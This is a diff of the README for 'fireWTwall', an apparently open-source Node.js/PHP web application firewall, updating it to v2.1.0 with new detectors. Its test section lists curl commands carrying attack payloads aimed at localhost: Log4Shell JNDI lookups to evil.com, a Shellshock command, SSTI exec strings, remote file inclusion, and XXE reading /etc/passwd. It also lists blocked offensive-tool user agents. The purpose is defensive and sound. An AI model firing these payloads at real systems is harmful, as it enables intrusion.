@@ -1,7 +1,7 @@
 # 🔥 fireWTwall
 
 [![npm](https://img.shields.io/npm/v/firewtwall)](https://www.npmjs.com/package/firewtwall)
-[![version](https://img.shields.io/badge/version-2.0.0-orange)](https://github.com/saarors/fireWTwall/releases)
+[![version](https://img.shields.io/badge/version-2.1.0-orange)](https://github.com/saarors/fireWTwall/releases)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Node.js](https://img.shields.io/badge/node-%3E%3D16-brightgreen)](https://nodejs.org)
 [![PHP](https://img.shields.io/badge/php-%3E%3D8.0-777BB4)](https://www.php.net)
@@ -53,7 +53,20 @@ Both versions share the same rule sets, detection philosophy, and NDJSON log for
 
 ---
 
-## What's new in v2.0.0
+## What's new in v2.1.0 — Metasploit-class protections
+
+| | Area | CVEs / Metasploit modules covered |
+|--|------|----------------------------------|
+| 🛡️ | **SSTI** (18 rules) | Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, OGNL/Struts2, Spring4Shell (CVE-2022-22965), Tornado |
+| 🛡️ | **RFI** — Remote File Inclusion (6 rules) | HTTP/FTP/SMB/expect:// inclusion, log poisoning, `/proc/self/environ` |
+| 🛡️ | **Log4Shell** (6 rules) | CVE-2021-44228 — JNDI LDAP/RMI/DNS, all obfuscation variants (`${lower:}`, `${::-j}`, nested) |
+| 🛡️ | **Shellshock** (2 rules) | CVE-2014-6271 / CVE-2014-7169 — `() { :; };` in any header |
+| 🛡️ | **NoSQL injection** (11 rules) | MongoDB `$ne`, `$gt`, `$lt`, `$where`, `$regex`, `$expr`, bracket-notation (`[$ne]=1`) |
+| 🛡️ | **LDAP injection** (6 rules) | Filter bypass, parenthesis injection, null-byte, uid/admin wildcard, hex-encoded chars |
+| 🛡️ | **Deserialization** (7 rules) | PHP `O:N:` objects, Java `AC ED 00 05` (base64 + hex), Python pickle, node-serialize RCE |
+| 🤖 | **97 blocked bots** | Added: msf/, msfpayload, tplmap, ysoserial, jexboss, commix, dotdotpwn, xsser, beef-, and 20+ more |
+
+## What was new in v2.0.0
 
 | | Area | Detail |
 |--|------|--------|
@@ -63,7 +76,7 @@ Both versions share the same rule sets, detection philosophy, and NDJSON log for
 | 🛡️ | **Prototype pollution** | Recursive JSON key scan for `__proto__`, `constructor.prototype` (Node.js) |
 | 🛡️ | **Mass assignment** | PHP equivalent — blocks `__destruct`, `__wakeup`, `_method`, `__class__` in input keys |
 | 📋 | **+40 detection rules** | SQL (+12), XSS (+8), Command injection (+8), Path traversal (+4) |
-| 🤖 | **69 blocked bots** | Added: ffuf, gobuster, nuclei, interactsh, Shodan, Censys, Metasploit, Nessus, wpscan, droopescan, and 20+ more |
+| 🤖 | **69 blocked bots** | ffuf, gobuster, nuclei, interactsh, Shodan, Censys, Metasploit, Nessus, wpscan, droopescan, and 20+ more |
 | 🍪 | **Cookie scanning** | All detectors now inspect cookies — logged as `cookie:<name>` |
 | 🔒 | **Hardened headers** | HSTS, CSP, `X-Permitted-Cross-Domain-Policies`, NEL — `X-Powered-By` removed |
 | 📝 | **TypeScript types** | Full `index.d.ts` ships with the npm package |
@@ -74,18 +87,25 @@ Both versions share the same rule sets, detection philosophy, and NDJSON log for
 
 | Layer | What it catches | Rules |
 |-------|----------------|:-----:|
-| **SQL Injection** | UNION SELECT, stacked queries, blind injection (SLEEP / WAITFOR / pg_sleep), EXTRACTVALUE, UPDATEXML, GTID_SUBSET, EXP(~()), sys schema, CASE WHEN, PROCEDURE ANALYSE, DBMS variable leaks (`@@version`) | **38** |
-| **XSS** | Script tags, `on*=` event handlers, DOM sinks (innerHTML, document.write), AngularJS `{{}}`, data URIs, SVG animate, CSS `@import`, `-moz-binding`, meta refresh, form action JS | **29** |
-| **Path Traversal** | `../` sequences, null bytes, PHP stream wrappers (`php://filter`), Windows paths (`C:\`, `%SYSTEMROOT%`, system32), `/boot/grub`, `.env`, `wp-config.php`, `.git/`, `.ssh/` | **18** |
-| **Command Injection** | Shell pipes / subshells, PowerShell, wget/curl RCE chains, base64 decode, Python / Ruby / Perl / PHP / Node.js CLI execution, netcat, whoami/id, env dump | **18** |
-| **SSRF** | Private IP ranges, cloud metadata endpoints, dangerous URI schemes in URL params | **3** |
-| **XXE** | DOCTYPE, ENTITY SYSTEM / PUBLIC, parameter entities, XInclude — XML bodies only | **5** |
-| **Open Redirect** | Absolute URLs or `//` in redirect / return / next / dest / goto params | **1** |
-| **Prototype Pollution** | `__proto__`, `constructor.prototype` — query, body, and nested JSON keys | **1** |
+| **SQL Injection** | UNION SELECT, stacked queries, blind (SLEEP/WAITFOR), EXTRACTVALUE, UPDATEXML, GTID_SUBSET, EXP(~()), sys schema, CASE WHEN, `@@version` | **38** |
+| **XSS** | Script tags, `on*=` handlers, DOM sinks, AngularJS `{{}}`, data URIs, SVG animate, CSS `@import`, `-moz-binding`, meta refresh | **29** |
+| **Path Traversal** | `../` sequences, null bytes, PHP wrappers, Windows paths (`C:\`, system32), `/boot/grub`, `.env`, `.git/`, `.ssh/` | **18** |
+| **Command Injection** | Shell pipes, PowerShell, wget/curl RCE, Python/Ruby/Perl/PHP/Node CLI, netcat, whoami, env dump | **18** |
+| **SSTI** | Jinja2, Twig, FreeMarker, Velocity, Smarty, ERB, OGNL/Struts2, Spring4Shell, Tornado | **18** |
+| **RFI** | HTTP/FTP/SMB/expect:// inclusion, log poisoning, `/proc/self/environ` — file-param names only | **6** |
+| **Log4Shell** | CVE-2021-44228 — JNDI LDAP/RMI/DNS + all obfuscation variants | **6** |
+| **Shellshock** | CVE-2014-6271 — `() { :; };` scanned in every header | **2** |
+| **NoSQL Injection** | MongoDB `$ne`, `$gt`, `$where`, `$regex`, `$expr` — params + bracket notation | **11** |
+| **LDAP Injection** | Filter bypass, parenthesis injection, null-byte, uid/admin wildcard, hex chars | **6** |
+| **Deserialization** | PHP `O:N:`, Java `AC ED 00 05` (base64 + hex), Python pickle, node-serialize RCE | **7** |
+| **SSRF** | Private IPs, cloud metadata (169.254.169.254, Azure, GCP), dangerous URI schemes | **3** |
+| **XXE** | DOCTYPE, ENTITY SYSTEM/PUBLIC, parameter entities, XInclude — XML bodies only | **5** |
+| **Open Redirect** | Absolute URLs or `//` in redirect/return/next/dest params | **1** |
+| **Prototype Pollution** | `__proto__`, `constructor.prototype` in query/body/JSON keys | **1** |
 | **CRLF / Header Injection** | HTTP response splitting, host-header injection | — |
-| **Rate Limiting** | Sliding-window per IP — configurable window, limit, and block duration. Pluggable store (Redis-ready) | — |
+| **Rate Limiting** | Sliding-window per IP — configurable window, limit, block duration. Redis-ready | — |
 | **IP Filter** | Blacklist + whitelist with CIDR — IPv4 and IPv6 | — |
-| **Bad Bot Blocking** | 69 blocked signatures: sqlmap, nikto, nmap, ffuf, nuclei, Shodan, wpscan, Metasploit, Nessus… | — |
+| **Bad Bot Blocking** | **97** blocked signatures: sqlmap, nmap, ffuf, nuclei, Metasploit (msf/), tplmap, ysoserial, Shodan… | — |
 | **HTTP Method Filter** | Rejects TRACE, CONNECT, and any non-configured verb | — |
 | **Request Size Limit** | `Content-Length` header check + streaming byte guard | — |
 | **Security Headers** | HSTS, CSP, COOP, CORP, COEP, Referrer-Policy, Permissions-Policy, NEL — `X-Powered-By` stripped | — |
@@ -325,7 +345,7 @@ curl "http://localhost:3000/?url=http://169.254.169.254/latest/meta-data"
 # SSRF — private IP → 403
 curl "http://localhost:3000/?redirect=http://192.168.1.1/admin"
 
-# XXE — external entity → 403  (send XML body)
+# XXE — external entity → 403
 curl -X POST http://localhost:3000/upload \
   -H "Content-Type: application/xml" \
   -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'
@@ -336,8 +356,49 @@ curl "http://localhost:3000/login?returnUrl=//evil.com"
 # Prototype pollution → 403
 curl "http://localhost:3000/?__proto__[admin]=true"
 
-# Bad bot (nmap UA) → 403
-curl -A "nmap scripting engine" http://localhost:3000/
+# Log4Shell (CVE-2021-44228) — scanned in every header → 403
+curl -H 'User-Agent: ${jndi:ldap://evil.com/a}' http://localhost:3000/
+
+# Log4Shell obfuscated variant → 403
+curl -H 'X-Api-Version: ${${lower:j}ndi:ldap://evil.com/a}' http://localhost:3000/
+
+# Shellshock (CVE-2014-6271) — any header → 403
+curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://localhost:3000/
+
+# SSTI — Jinja2/Python → 403
+curl "http://localhost:3000/?name={{__class__.__mro__}}"
+
+# SSTI — Twig → 403
+curl "http://localhost:3000/?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}"
+
+# SSTI — Struts2/OGNL → 403
+curl "http://localhost:3000/?redirect=%{#a=new+java.lang.ProcessBuilder({'id'}).start()}"
+
+# Remote file inclusion → 403
+curl "http://localhost:3000/?file=http://evil.com/shell.php"
+
+# NoSQL injection — MongoDB $ne → 403
+curl "http://localhost:3000/login?user[$ne]=x&pass[$ne]=x"
+
+# NoSQL injection — JSON body → 403
+curl -X POST http://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": {"$ne": null}, "pass": {"$ne": null}}'
+
+# LDAP injection → 403
+curl "http://localhost:3000/search?user=*)(uid=*))(|(uid=*"
+
+# PHP deserialization → 403
+curl "http://localhost:3000/?data=O:8:\"stdClass\":0:{}"
+
+# Java deserialization (base64 magic) → 403
+curl "http://localhost:3000/?payload=rO0ABXNy"
+
+# Bad bot (Metasploit) → 403
+curl -A "msf/1.0" http://localhost:3000/
+
+# Bad bot (tplmap) → 403
+curl -A "tplmap/0.5" http://localhost:3000/
 
 # Clean request → 200
 curl http://localhost:3000/
@@ -423,32 +484,41 @@ Set `'debug' => true` in `waf.config.php`. The same `X-WAF-*` response headers a
 
 ## Middleware pipeline
 
-Requests pass through **16 stages** (Node.js) / **15 stages** (PHP) in this order:
+Requests pass through **23 stages** (Node.js) / **22 stages** (PHP) in this order:
 
 ```
 Request
   │
-  ├─ 1  Security headers          → added to every response regardless of outcome
-  ├─ 2  Request size              → 413 if Content-Length exceeds limit
-  ├─ 3  HTTP method               → 405 if verb not in allowedMethods
-  ├─ 4  IP filter                 → whitelist bypasses everything; blacklist → 403
-  ├─ 5  Rate limiting             → 429 + Retry-After if window exceeded
-  ├─ 6  Bot detection             → 403 if User-Agent matches 69 blocked signatures
-  ├─ 7  Prototype pollution       → 403 (__proto__, constructor.prototype in keys)
-  ├─ 8  SSRF                      → 403 (private IPs, metadata, schemes in URL params)
-  ├─ 9  XXE                       → 403 (XML bodies with DOCTYPE / ENTITY)
-  ├─ 10 Open redirect             → 403 (absolute URL in redirect-style params)
-  ├─ 11 Header injection (CRLF)   → 400
-  ├─ 12 Path traversal            → 403 (18 rules)
-  ├─ 13 Command injection         → 403 (18 rules)
-  ├─ 14 SQL injection             → 403 (38 rules)
-  └─ 15 XSS                       → 403 (29 rules)
-        │
-        ▼
-    Application
+  ├─  1  Security headers          → added to every response regardless of outcome
+  ├─  2  Request size              → 413 if Content-Length exceeds limit
+  ├─  3  HTTP method               → 405 if verb not in allowedMethods
+  ├─  4  IP filter                 → whitelist bypasses everything; blacklist → 403
+  ├─  5  Rate limiting             → 429 + Retry-After if window exceeded
+  ├─  6  Bot detection             → 403 if User-Agent matches 97 blocked signatures
+  ├─  7  Prototype pollution       → 403 (__proto__, constructor.prototype in keys)
+  ├─  8  SSRF                      → 403 (private IPs, cloud metadata, URI schemes)
+  ├─  9  XXE                       → 403 (XML bodies with DOCTYPE / ENTITY / XInclude)
+  ├─ 10  Open redirect             → 403 (absolute URL in redirect-style params)
+  ├─ 11  Header injection (CRLF)   → 400
+  ├─ 12  Path traversal            → 403 (18 rules)
+  ├─ 13  Command injection         → 403 (18 rules)
+  ├─ 14  SQL injection             → 403 (38 rules)
+  ├─ 15  XSS                       → 403 (29 rules)
+  ├─ 16  SSTI                      → 403 (18 rules — Jinja2, Twig, OGNL, Spring, ERB…)
+  ├─ 17  RFI                       → 403 (6 rules — HTTP/FTP/SMB/expect/log-poison)
+  ├─ 18  Log4Shell                 → 403 (6 rules — CVE-2021-44228 + all obfuscations)
+  ├─ 19  Shellshock                → 403 (2 rules — CVE-2014-6271, scans ALL headers)
+  ├─ 20  NoSQL injection           → 403 (11 rules — MongoDB operators + bracket syntax)
+  ├─ 21  LDAP injection            → 403 (6 rules — filter bypass, null-byte, wildcard)
+  └─ 22  Deserialization           → 403 (7 rules — PHP, Java, Python, node-serialize)
+         │
+         ▼
+     Application
 ```
 
-All pattern-based checks (stages 12–15) scan: `query params` · `request body` · `URL path` · `cookies` · `headers`
+Pattern-based stages (12–22) scan: `query params` · `request body` · `URL path` · `cookies` · `all headers`
+
+> Log4Shell (stage 18) and Shellshock (stage 19) scan **every HTTP header** — not just params.
 
 ---
 
@@ -507,8 +577,8 @@ fireWTwall/
 │   ├── package.json
 │   ├── config/
 │   │   ├── waf.config.js
-│   │   └── bad-bots.json            ← 69 blocked signatures
-│   ├── middleware/                  ← 16 independent middleware modules
+│   │   └── bad-bots.json            ← 97 blocked signatures
+│   ├── middleware/                  ← 22 independent middleware modules
 │   │   ├── securityHeaders.js       ← HSTS, CSP, NEL, removes X-Powered-By
 │   │   ├── requestSize.js
 │   │   ├── methodFilter.js
@@ -523,7 +593,14 @@ fireWTwall/
 │   │   ├── pathTraversal.js         ← 18 rules
 │   │   ├── commandInjection.js      ← 18 rules
 │   │   ├── sqlInjection.js          ← 38 rules
-│   │   └── xss.js                   ← 29 rules
+│   │   ├── xss.js                   ← 29 rules
+│   │   ├── ssti.js                  ← 18 rules (Jinja2, Twig, OGNL, Spring, ERB…)
+│   │   ├── rfi.js                   ← 6 rules (HTTP/FTP/SMB/expect/log-poison)
+│   │   ├── log4shell.js             ← 6 rules (CVE-2021-44228, all headers)
+│   │   ├── shellshock.js            ← 2 rules (CVE-2014-6271, all headers)
+│   │   ├── nosqlInjection.js        ← 11 rules (MongoDB operators + bracket notation)
+│   │   ├── ldapInjection.js         ← 6 rules (filter bypass, null-byte, wildcard)
+│   │   └── deserialization.js       ← 7 rules (PHP, Java, Python, node-serialize)
 │   ├── utils/
 │   │   ├── patternMatcher.js        ← Multi-pass decode + cookie scanning
 │   │   ├── ipUtils.js               ← IPv4 + IPv6 CIDR matching
@@ -536,25 +613,32 @@ fireWTwall/
     ├── composer.json
     ├── config/
     │   ├── waf.config.php
-    │   └── bad-bots.php             ← 69 blocked signatures
+    │   └── bad-bots.php             ← 97 blocked signatures
     └── src/
-        ├── WAF.php                  ← 15-step pipeline
+        ├── WAF.php                  ← 22-step pipeline
         ├── Request.php              ← Double-encoding + Unicode decode + cookies
         ├── IpFilter.php
         ├── RateLimiter.php          ← APCu or file-based fallback
         ├── Logger.php               ← NDJSON with flock
         ├── Response.php             ← HSTS, CSP, removes X-Powered-By
         └── detectors/
-            ├── SqlInjectionDetector.php     ← 38 rules
-            ├── XssDetector.php              ← 29 rules
-            ├── PathTraversalDetector.php    ← 18 rules
-            ├── CommandInjectionDetector.php ← 18 rules
+            ├── SqlInjectionDetector.php       ← 38 rules
+            ├── XssDetector.php                ← 29 rules
+            ├── PathTraversalDetector.php      ← 18 rules
+            ├── CommandInjectionDetector.php   ← 18 rules
             ├── HeaderInjectionDetector.php
             ├── BotDetector.php
             ├── SsrfDetector.php
             ├── XxeDetector.php
             ├── OpenRedirectDetector.php
-            └── MassAssignmentDetector.php
+            ├── MassAssignmentDetector.php
+            ├── SstiDetector.php               ← 18 rules
+            ├── RfiDetector.php                ← 6 rules
+            ├── Log4ShellDetector.php          ← 6 rules (CVE-2021-44228)
+            ├── ShellshockDetector.php         ← 2 rules (CVE-2014-6271)
+            ├── NoSqlInjectionDetector.php     ← 11 rules
+            ├── LdapInjectionDetector.php      ← 6 rules
+            └── DeserializationDetector.php    ← 7 rules
 ```
 
 ---
